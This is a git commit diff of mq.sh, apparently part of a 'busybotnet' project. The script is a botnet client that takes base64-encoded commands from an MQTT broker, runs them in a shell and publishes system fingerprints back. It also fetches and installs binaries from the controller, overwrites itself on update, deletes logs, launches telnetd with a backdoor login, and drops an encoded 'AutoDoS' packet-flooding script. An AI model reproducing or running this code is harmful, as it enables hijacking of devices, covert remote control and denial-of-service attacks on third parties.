f6775639ff11425ee4ce24a118832025c51153b6
KekSec <isdrupter@users.noreply.github.com>
2016-10-21 03:05:38 -0400

    New funx, improved logic, proper redirection
    Mqtt shell. Executes base64 encoded messages in the shell, and than sends back jsonified output.

--- mq.sh
+++ mq.sh
@@ -1,124 +1,295 @@
 #            __   __       			 
 #      |\/| /  \ /__` |__| 			 
 #      |  | \__X .__/ |  | 	
-		 
+# Message Queing Telemetry Transport Shell	 
 # https://github.com/isdrupter/busybotnet
 
-# To properly daemonize, do not use a shebang \
-# and run with nohup. Use bash or ash like: \
-# nohup bash mq.sh
+
+jsonify(){ # Turn shell output into json
+tempf=/tmp/.mqsh/jshcmd
+input=/tmp/.mqsh/_cmd_
+echo $@ > $tempf
+bbj="$(jshon -Qs 2>/dev/null 1>/dev/null)"
+ip=$bbj"$(/sbin/ifconfig $intf | grep Mask | cut -d ':' -f2 | cut -d " " -f1)"
+unixtime=$bbj"$(date +%s)"
+date=$bbj"$(date)"
+uptime=$bbj"$(uptime | sed s/\,//)"
+kernelcmdline=$bbj"$(cat /proc/cmdline)"
+id=$bbj"$(id)"
+kcrypto=$bbj"$(cat /proc/crypto | grep name | cut -d':' -f2 | uniq | tr -s '\n' ' '|sed s/\,//)"
+version=$bbj"$(cat /proc/version)"
+memstat=$bbj"$(cat /proc/meminfo | head -n 3 | tr -s '\n' ' ')"
+cwd=$bbj"$(pwd)"
+shell=$bbj"$(echo $SHELL)"
+getstty=$bbj"$(stty)"
+term=$bbj"$(echo $TERM)"
+cpuname=$bbj"$(cat /proc/cpuinfo | grep name)"
+status=$bbj"$(if ([ -s /tmp/.status ] && [ -f /tmp/.status ]); then echo "SYSTEM_BUSY" ; else echo "SYSTEM_READY";fi)"
+hashcmd=$bbj"$(md5sum $tempf | sed -e 's/\  \/tmp\/.mqsh\/jshcmd\>//g')"
+uuid=$bbj"'$unixtime.$hashcmd'"
+output=$bbj"'$(ash $tempf)'"
+cmdline=$bbj"$(echo $(cat $input))"
+
+echo '{
+"ip" : "'$ip'",
+"unixtime": "'$unixtime'",
+"date": "'$date'",
+"uptime" : "'$uptime'",
+"cpuname": "'$cpuname'",
+"memstat" : "'$memstat'",
+"id" : "'$id'",
+"version" : "'$version'",
+"kernel_cmdline": "'$kernelcmdline'",
+"kernel_crypto": "'$kcrypto'",
+"shell": "'$shell'",
+"term": "'$term'",
+"stty": "'$getstty'",
+"cwd": "'$cwd'",
+"uuid": "'$uuid'",
+"status": "'$status'",
+"cmdline": "'$cmdline'",
+"output": "'$output'"
+}' 2>>$errorlog
+}
 
 publish(){
-uxt=`date +%s`
-jshout=$workdir/jshout.$uxt
-if ([[ $debug == "1" ]]);then echo "publishing output to topic $pubtopic on $host";fi
-(jsh cat $out | base64) 2>> $errorlog > $jshout
-if ([[ "$?" -eq "0" ]] && [[ -s $out ]]); then
-  pubclient -h $host -i ${ip} -q 2 -t "data/$pubtop" -u bot -P $pass -f $jshout
-fi
-(rm $out;rm $jshout) 2>/dev/null
-} 
-execute(){
-_cmd_=$workdir/_cmd_ ; echo $@ > $_cmd_
 uxt=$(date +%s)
+jshout=$workdir/jshout.$uxt
+jshin=$workdir/_cmd_
+[ $debug == "1" ] && echo "[<<] Publishing output to topic $pubtop on $host"
+echo "$input" >$jshin
+(jsonify "cat $out" | base64) 2>> $errorlog > $jshout
+if ([[ "$?" -eq "0" ]] && [[ -s $out ]]); then
+  pubclient -h $host -i ${ip} -q 1 -t "data/$pubtop" -u bot -P $pass -f $jshout
+fi
+rm -f $out $jshout $jshin 2>/dev/null
+}
+
+execute(){
+input="$@"
+uxt=$(date +%s)
+temp=$(mktemp cmd.XXXXXX);rm $temp
+piddir=/tmp/.mqsh/pids
+case "$@" in *)
+_cmd_="${workdir}/${temp}"
+printf 'export thrdpid=$(mktemp XXXXXX);rm $thrdpid \necho "$$" > /tmp/.mqsh/pids/${thrdpid}.pid \n' >$_cmd_
+echo $@ >> $_cmd_
 out="$workdir/output.${uxt}"
-cmdpid="$piddir/output.${uxt}.pid"
-(((ash $_cmd_) ; echo "$!" > $cmdpid) 2>> $errorlog > $out ); ((if [[ -s $out ]] ; then publish $out; fi &)&)
-rm $cmdpid 
-if ([[ $debug == "1" ]]);then echo 'Executed command in a thread';fi
+(((bash $_cmd_) ;wait) 2>> $errorlog > $out );\
+((if [[ -s $out ]] ; then publish $out "$input" & else rm $out;fi &)&)
+for i in `ls $piddir`;do if ! ps|grep `cat $piddir/$i`|grep -v 'grep' >/dev/null;then rm $piddir/$i;fi ;done
+rm -f $_cmd_
+esac
+[ $debug == "1" ] && echo '[<<] Executed command in a thread'
 } 
-spitSomeBin(){ # jsonify output
-cat << EOF > /tmp/jsh
 
-IyEvdmFyL2Jpbi9hc2gKI21ha2UgYSBjbWQganNvbgoKCnRlbXBmPS90bXAvLm1xc2gvanNoY21kCmlucHV0PS90bXAvLm1xc2gvX2NtZF8KZWNobyAkQCA+ICR0ZW1wZgpiYmo9IiQoanNob24gLXMgMj4vZGV2L251bGwgMT4vZGV2L251bGwpIgppcD0kYmJqIiQoL3NiaW4vaWZjb25maWcgZXRoMSB8IGdyZXAgTWFzayB8IGN1dCAtZCAnOicgLWYyIHwgY3V0IC1kICIgIiAtZjEpIgp1bml4dGltZT0kYmJqIiQoZGF0ZSArJXMpIgpkYXRlPSRiYmoiJChkYXRlKSIKdXB0aW1lPSRiYmoiJCh1cHRpbWUgfCBzZWQgcy9cLC8vKSIKa2VybmVsY21kbGluZT0kYmJqIiQoY2F0IC9wcm9jL2NtZGxpbmUpIgppZD0kYmJqIiQoaWQpIgprY3J5cHRvPSRiYmoiJChjYXQgL3Byb2MvY3J5cHRvIHwgZ3JlcCBuYW1lIHwgY3V0IC1kJzonIC1mMiB8IHVuaXEgfCB0ciAtcyAnXG4nICcgJ3xzZWQgcy9cLC8vKSIKdmVyc2lvbj0kYmJqIiQoY2F0IC9wcm9jL3ZlcnNpb24pIgptZW1zdGF0PSRiYmoiJChjYXQgL3Byb2MvbWVtaW5mbyB8IGhlYWQgLW4gMyB8IHRyIC1zICdcbicgJyAnKSIKY3dkPSRiYmoiJChwd2QpIgpzaGVsbD0kYmJqIiQoZWNobyAkU0hFTEwpIgpnZXRzdHR5PSRiYmoiJChzdHR5KSIKdGVybT0kYmJqIiQoZWNobyAkVEVSTSkiCmNwdW5hbWU9JGJiaiIkKGNhdCAvcHJvYy9jcHVpbmZvIHwgZ3JlcCBuYW1lKSIKI291dHB1dD0kYmJqIiQoJGNtZGxpbmUpIgpzdGF0dXM9JGJiaiIkKGlmIChbIC1zIC90bXAvLnN0YXR1cyBdICYmIFsgLWYgL3RtcC8uc3RhdHVzIF0pOyB0aGVuIGVjaG8gIlNZU1RFTV9CVVNZIiA7IGVsc2UgZWNobyAiU1lTVEVNX1JFQURZIjtmaSkiCmhhc2hjbWQ9JGJiaiIkKG1kNXN1bSAkdGVtcGYgfCBzZWQgLWUgJ3MvXCAgXC90bXBcLy5tcXNoXC9qc2hjbWRcPi8vZycpIgp1dWlkPSRiYmoiJyR1bml4dGltZS4kaGFzaGNtZCciCm91dHB1dD0kYmJqIickKGFzaCAkdGVtcGYpJyIKY21kbGluZT0kYmJqIiQoZWNobyAkKGNhdCAkaW5wdXQpKSIKCmVjaG8gJ3sKImlwIiA6ICInJGlwJyIsCiJ1bml4dGltZSI6ICInJHVuaXh0aW1lJyIsCiJkYXRlIjogIickZGF0ZSciLAoidXB0aW1lIiA6ICInJHVwdGltZSciLAoiY3B1bmFtZSI6ICInJGNwdW5hbWUnIiwKIm1lbXN0YXQiIDogIickbWVtc3RhdCciLAoiaWQiIDogIickaWQnIiwKInZlcnNpb24iIDogIickdmVyc2lvbiciLAoia2VybmVsX2NtZGxpbmUiOiAiJyRrZXJuZWxjbWRsaW5lJyIsCiJrZXJuZWxfY3J5cHRvIjogIicka2NyeXB0byciLAoic2hlbGwiOiAiJyRzaGVsbCciLAoidGVybSI6ICInJHRlcm0nIiwKInN0dHkiOiAiJyRnZXRzdHR5JyIsCiJjd2QiOiAiJyRjd2QnIiwKInV1aWQiOiAiJyR1dWlkJyIsCiJzdGF0dXMiOiAiJyRzdGF0dXMnIiwKImNtZGxpbmUiOiAiJyRjbWRsaW5lJyIsCiJvdXRwdXQiOiAiJyRvdXRwdXQnIgp9JyAyPi9kZXYvbnVsbAoKCgo=
+repoGet(){ # Download, verify, and install binaries/scripts
+checkhash(){
+bin="$1";hash="$2"
+if (echo $hash *$bin | sha1sum -c -) > /dev/null 2>&1 ; then
+  return 0
+else 
+  return 1
+fi
+}
+# Assumes you have an http:server/repo hosting files and sha1sums
+getbin="$1"
+[ $debug == "1" ] && echo "Getting hash file of $1"
+wget -O /tmp/bin.sha1 $host/repo/$getbin.sha1
+gethash=$(cat /tmp/bin.sha1)
+if ! checkhash /var/bin/$getbin $gethash;then 
+  rm /tmp/bin.out; 
+  for i in 1 2 3 4 5 ;do 
+    [ $debug == "1" ] && echo "Downloading $getbin from repository..."
+    wget -O /tmp/bin.out $host/repo/$getbin; 
+    if checkhash /tmp/bin.out $gethash;then  
+      [[ $debug == "1" ]] && echo "Hash matches!"
+      break
+    else 
+      [[ $debug == "1" ]] && echo "Corrupted file, wait and try again..."
+      sleep $(echo $RANDOM|head -c 2)
+    fi
+  done 
+mv /tmp/bin.out /var/bin/$getbin
+chmod +x /var/bin/$getbin
+fi
+}
 
-EOF
-(cat /tmp/jsh | base64 -d >/var/bin/jsh ; chmod +x /var/bin/jsh)2>>$errorlog
-cat << EOF > /tmp/dos
+clearmem(){
+rm -f $workdir/cmd.*
+>$cwd/nohup.out
+rm -f /var/log/h*
+}
+
+ctrl_c(){ # If running in debug mode
+    echo -en "\n## Caught SIGINT; Clean up and Exit... \n"
+    (kill `cat $pidfile` ;\
+    rm -rf $workdir ;\
+    rm $pipe $enc $denc $pidfile /var/run/mq.pid ;\ 
+    kill -9 $$ ;\
+    exit) >/dev/null 2>&1
+}
+
+quit(){ 
+rm $pipe $denc
+kill -9 `cat $pidfile`;rm $pidfile
+kill -9 $$
+[ "debug" == "0" ] && reboot ||\
+trap "rm -rf $workdir"
+exit
+} 
+
+
+killThreads(){ 
+echo '[info] Received killall, killing all threads and messages...'
+  for i in $(ls $piddir);do
+    echo "Killing $i" >> error.log
+    kill -15 $(cat $piddir/$i) # Use -9 if you need, but remember that creates zombies!
+  done
+  killall pubclient
+  for i in `pgrep -f` 'bash /tmp/.mqsh/_cmd_';do kill $i ;done 2>/dev/null
+}
+
+run(){
+denc=$workdir/denc
+[ $debug == "1" ] &&\
+echo Host: "$host" ;echo Pass :"$pass" ;echo Debug: "$debug" ;echo Path:"$path"
+
+if [[ ! -p "$pipe" ]]; then mkfifo $pipe ;fi
+(subclient -h $host -q 2 -i ${ip} -t shell/${ip} -t shell/${subtop} -u bot -P $pass > $pipe) &\ 
+echo "$!" > $pidfile # Daemonize the listener
+
+while true;do # forever and ever (just in case)
+while read line; do # read from the pipe
+[ $debug == "1" ] &&  echo '[>>] Got a command!'
+((echo "${line}" | base64 -d) 2>> $errorlog) >$denc
+[ $debug == "1" ] &&  echo '[>>] Echoed line to file.'
+if [[ -s "$denc" ]] ; then 
+
+case "$(cat $denc)" in # decide what to do with it
+__quit__)
+echo '[warn] Received quit, bailing...'
+quit
+;;
+__update__) 
+# This still needs more testing. Be careful before trying to update your entire net.
+echo '[warn] Received update, getting new config...'
+wget -O $0 $host/mq # overwrite this file from your httpd
+# It may be better to use $ exec $0 , idk
+trap "nohup bash $0" 15 # kill this script
+kill `cat pidfile`  # and the listener
+kill $$ # kill this pid, hopefully triggering the trap
+;;
+__killall__)
+echo '[info] Received a killall, getting new config...'
+killThreads & 
+  
+;;
+_clearmem_)
+echo '[info] Received clearenv, deleting the logs...'
+clearmem &
+;;
+
+_GET_*)
+cat $denc | sed s'/_GET_//' >$workdir/get
+getBin="$(cat $workdir/get)"
+repoGet $getBin &
+;;
+
+_SH_*) # Directly run a command, do not parse into json
+shcmd=$(cat $denc|sed s'/_SH_//') 
+echo $shcmd > /tmp/shcmd
+(((bash /tmp/shcmd) 2>$errorlog | base64| pubclient -h $host -i ${ip} -q 1 -t "data/$pubtop" -u bot -P $pass -s;rm -f /tmp/shcmd)&)&
+;;
+
+*) # otherwise execute whatever
+[ $debug == "1" ] && echo "[*] Received a command, will exec..."
+cmd="$(cat $denc)"
+execute "${cmd}" & # ALWAYS run background, this must be asynchronous!
+if ([[ "$?" -eq "0" ]] && [[ $debug == "1" ]]); then  
+echo '[*] Executed the command...'
+fi
+;;
+
+esac
+fi
+done <$pipe
+done
+}
+
+doFirst(){ # Stuff to do before launch
+iptables-save >/tmp/ipt.orig
+echo 'nameserver 8.8.8.8' >/tmp/resolv.conf
+echo 'nameserver 8.8.4.4' >>/tmp/resolv.conf
+>/var/version.1.6
+(killall -9 telnetd ;telnetd -l /var/bin/backdoor)&
+}
+
+spitSomeBin(){ # Scripts/binaries you want to write at launch
+cat << EOF > /tmp/dos 
 
 IyEvdmFyL2Jpbi9hc2gKIyBBdXRvRG9TIC0gU2hlbGwgV3JhcHBlciB0byBTZW5kIE11bHRpcGxlIFNwb29mZWQgUGFja2V0cwojIFNoZWxselJ1cyAyMDE2CiMKCm1vZGU9JDEKaXA9JDIKcG9ydD0kezM6LSI4MCJ9CnRocmVhZHM9JHs0Oi0iNSJ9CnNlY3M9JHs1Oi0iMzAifQoKc3RhdGZpbGU9L3RtcC8uc3RhdHVzCgoKI1NFUSgpe2k9MDt3aGlsZSBbWyAiJGkiIC1sdCAxMCBdXTtkbyBlY2hvICRpOyBpPWBleHByICRpICsgMWA7ZG9uZX0KdXNhZ2UoKXsKZWNobyAiIFwKLSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy0KIEF1dG8tRG9zIFZlcnNpb24gMy4wCiAgVXNhZ2U6CiAgJDAgW3RhcmdldCBpcF1bcG9ydF1bdGhyZWFkc11bc2Vjc10KICBEZWZhdWx0OiA1IHRocmVhZHMvMzAgc2VjIE1heDogMjAgdGhyZWFkcy8zMDAgc2VjCi0jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy0iCn0KCmZpbmlzaCgpewogICAgaWYgW1sgLXMgIiRzdGF0ZmlsZSIgXV07dGhlbgogICAgID4kc3RhdGZpbGUKICAgIGZpCn0KCnRjcCgpewojZWNobyAiJHRoaXNib3QgOiIKcG9ydD0kezI6LSI4MCJ9CnRocmVhZHM9JHszOi0iNSJ9CnNlY3M9JHs0Oi0iMzAifQplY2hvICJIaXR0aW5nICRpcDokcG9ydCBGb3IgJHNlY3Mgc2VjcyB3aXRoICR0aHJlYWRzIHRocmVhZHMgbW9kZSB0Y3AiCnNzeW4yICRpcCAkcG9ydCAkdGhyZWFkcyAkc2VjcyA+L2Rldi9udWxsICYgZWNobyAiJCEiID4gJHN0YXRmaWxlCnNsZWVwICRzZWNzICYmIGZpbmlzaAp9CnVkcCgpewpwb3J0PSR7MjotIjgwIn0KdGhyZWFkcz0kezM6LSI1In0Kc2Vjcz0kezQ6LSIzMCJ9CiNlY2hvICIkdGhpc2JvdCA6IgplY2hvICJIaXR0aW5nICRpcDokcG9ydCBmb3IgJHNlY3Mgc2VjcyB3aXRoICR0aHJlYWRzIHRocmVhZHMgbW9kZSB1ZHAiCnN1ZHAgJGlwICRwb3J0IDEgJHRocmVhZHMgJHNlY3MgPi9kZXYvbnVsbCAmIGVjaG8gIiQhIiA+ICRzdGF0ZmlsZQpzbGVlcCAkc2VjcyAmJiBmaW5pc2gKfQoKa2lsbEl0KCl7CmtpbGwgLTkgYGNhdCAkc3RhdGZpbGVgOyhbICIkPyIgLWVxICIwIiBdKSAmJiBlY2hvICJLaWxsZWQiOz4kc3RhdGZpbGUKfQoKY2hlY2soKXsKCmlmIFtbICEgLWYgJHN0YXRmaWxlIF1dO3RoZW4gdG91Y2ggJHN0YXRmaWxlO2ZpCnN0YXQ9YGNhdCAkc3RhdGZpbGVgCiN0aGlzQm90PWAvc2Jpbi9pZmNvbmZpZyBldGgxIHwgZ3JlcCBNYXNrIHwgY3V0IC1kICc6JyAtZjIgfCBjdXQgLWQgIiAiIC1mMWAKaWYgKFtbICIkaXAiID09ICIiIF1dIHx8IFtbICIkcG9ydCIgPT0gIiIgXV0gfHwgW1sgIiR0aHJlYWRzIiAtZ3QgIjIwIiBdXSB8fCBbWyAiJHNlY3MiIC1ndCAiMzAwIiBdXSApCnRoZW4KdXNhZ2UKZXhpdCAxCmVsc2UgCmlmIFsgLXMgJHN0YXRmaWxlIF0gO3RoZW4KZWNobyBTeXN0ZW0gaXMgYnVzeS4gV2FpdCBhIG1pbnV0ZS4KZXhpdCAxCmZpCmZpCn0KCmNhc2UgJG1vZGUgaW4gLXR8LS10Y3ApCgpjaGVjawp0cmFwIGZpbmlzaCAxIDIgOAp0Y3AgJGlwICRwb3J0ICR0aHJlYWRzICRzZWNzCgo7OwotdXwtLXVkcCkKY2hlY2sKdHJhcCBmaW5pc2ggMSAyIDgKdWRwIGlwICRwb3J0ICR0aHJlYWRzICRzZWNzCgo7OwoKLWt8LS1raWxsKQpraWxsSXQKOzsKKikKZWNobyAiJDAgW21vZGVbLS10Y3AvLS11ZHBdXSBbaXBdIFtwb3J0XSBbdGhyZWFkXSBbc2Vjc10iCjs7CmVzYWMKCmV4aXQK 
 
 EOF
-(cat /tmp/dos | base64 -d > /var/bin/dos  ; chmod +x /var/bin/dos)2>>$errorlog
+(cat /tmp/dos | base64 -d > /var/bin/dos  ; chmod +x /var/bin/dos; rm -f /tmp/dos)2>>$errorlog
 } 
-ctrl_c(){
-    echo -en "\n## Caught SIGINT; Clean up and Exit \n"
-    kill `cat $pidfile`
-    rm $pipe $enc $denc $workdir/output* 2>/dev/null
-    exit
-}
-quit(){ 
-rm $pipe $enc $denc $workdir/output*
-kill -9 `cat $pidfile`
-rm $pidfile;reboot;exit 
-} 
-update(){
-trap "" 1 2
-(time=`awk -v min=5 -v max=60 'BEGIN{srand(); print int(min+rand()*(max-min+1))}'`; \
-cd /var/bin;rm mq;kill -9 `cat $pidfile`; \
-for i in 1 2 3 4 5;do \
-  echo "Mqsh Updating: attempt $i"; \
-  cd /var/bin;>mq;tftp -g -r mq $host; \
-  if [[ "$?" -eq "0" ]];then \
-    (nohup ash mq) && break;  \
-     else \
-    sleep $time; \
-  fi; \
-done)
-} 
-run(){
-enc=$workdir/enc;denc=$workdir/denc
-if ([[ $debug == "1" ]]); then  
-  echo Host: "$host" ;echo Pass :"$pass" ;echo Debug: "$debug" ;echo Path:"$path"
-fi
-if [[ ! -p "$pipe" ]]; then mkfifo $pipe ;fi
-(subclient -h $host -q 2 -i ${ip} -t shell/$subtop -u bot -P $pass > $pipe) & echo "$!" > $pidfile
-while read line <$pipe; do
-(echo "$line" | base64 -d) 2>> $errorlog > $denc
-    if grep -q '__quit__' $denc; then 
-      echo 'Received quit, bailing!'
-        quit;break
-    elif grep -q '_update_' $denc;then
-        echo 'Received update, getting new config...'
-        update
-    elif grep -q '_killall_' $denc;then
-        echo 'Received killall, killing all threads...'
-        for i in $(ls $piddir);do
-          echo "Killing $i"
-          kill $(cat $piddir/$i)
-        done
-    else
-      if ([[ $debug == "1" ]]);then echo Received a command, will exec...;fi
-      cmd=$(cat $denc) ; execute ${cmd} &  >$enc ; > $denc
-    fi
-done }
+
+#######################
+# Program start
+#######################
+cwd=$(pwd)
 workdir="/tmp/.mqsh"
-piddir="$workdir/pids"
-if [[ ! -d $workdir ]];then mkdir $workdir;fi
-if [[ ! -d $piddir ]];then mkdir $piddir;fi
+piddir="${workdir}/pids"
 pipe=$workdir/p
-pidfile=$workdir/sub.pid
 errorlog="$workdir/error.log"
-host=${1:-"127.0.0.1"}
-pass=${2:-"x"}
-path=${3:-"/usr/sbin:/bin:/usr/bin:/sbin"}
+rm -f pipe >/dev/null;>$errorlog
+
+if ([[ "id -u" == "0" ]] || [[ -w /var/run ]]) ; then
+  pidfile=/var/run/sub.pid
+else
+  pidfile=$workdir/sub.pid
+fi
+
+if ([ -s $pidfile ] && pidof subclient >/dev/null) ; then 
+  [ $debug == "1" ] &&\
+  echo "Will not run a clone, killing clones..."
+  kill -9 $(cat /var/run/mq.pid) ||
+  kill -9 $(cat /var/run/sub.pid) ||  kill -9 $(cat /tmp/sub.pid)
+fi
+
+if [[ ! -d $workdir ]]; then 
+  mkdir $workdir
+fi
+
+if [[ ! -d $piddir ]]; then 
+  mkdir $piddir
+fi
+# Set variables here. Can override on the command line. Run in 
+# debug mode (set debug = 1) the first time to see how it works.
+host=${1:-"localhost"}
+pass=${2:-"password"}
+path=${3:-"$PATH:/var/bin"}
 debug=${4:-"0"}
 intf=${5:-"eth0"}
-subtop=${6:-"in"}
-pubtop=${7:-"out"}
+subtop=${6:-"shell"}
+pubtop=${7:-"data"}
 ip=$(/sbin/ifconfig $intf | grep Mask | cut -d ':' -f2 | cut -d " " -f1)
-echo "MqSH Version 1.0-----------------------------------------------"
-echo "Usage: [$0][[host]default:127.0.0.1]][[pass][default:x]]"
-echo "             \ [[path][[default:/var/bin]][[debug][[default:0]]"
+echo "MqSH Version 1.6-----------------------------------------------"
+echo "Usage: [$0][[host]default:127.0.0.1]][[pass][default:password]]"
+echo "        [[PATH][[default:\$PATH:/var/bin]][[debug][[default:0]]"
 echo "		    \ [[nicid]]	[[subtopic]][[pubtopic]]	     "
 echo "Options:-------------------------------------------------------"
 export PATH=$path
 if ([[ "$debug" == "1" ]]);then
   spitSomeBin
-  trap ctrl_c 2
+  trap "ctrl_c" EXIT INT TERM
   run $host $pass $path $debug $key $intf $subtop $pubtop 
 else
-  trap "" 1 2 8
   spitSomeBin 2>>$errorlog
-  run $host $pass $path $debug $key $intf $subtop $pubtop  2>>$errorlog & 
+  doFirst 2>>$errorlog
+  trap "" 1
+  errorlog=/dev/null
+  run $host $pass $path $debug $key $intf $subtop $pubtop  2>>$errorlog &
 fi
+
+
